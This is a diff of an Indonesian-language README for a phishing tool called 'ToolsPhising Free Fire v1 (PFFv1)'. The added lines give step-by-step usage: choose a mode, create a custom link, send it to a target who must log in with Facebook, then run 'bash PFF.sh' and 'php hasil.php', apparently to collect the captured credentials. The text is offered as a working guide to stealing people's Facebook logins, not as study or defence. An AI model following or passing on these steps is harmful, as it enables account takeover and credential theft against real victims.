@@ -17,12 +17,19 @@ Ini adalah ToolsPhising Free Fire v1 (PFFv1) By KCHTZ
 <li><code>apt update && apt upgrade</code></li>
 
 Pilih mode nomor 1 aja biar cepet:v
+
 Buat link custom/tidak terserah kalian
+
 Salin link...beri ke target dan target harus login fb
+
 Buka sesion baru
+
 cd PFFv1
+
 bash PFF.sh
+
 php hasil.php
+
 Terimakasih:)
 
 
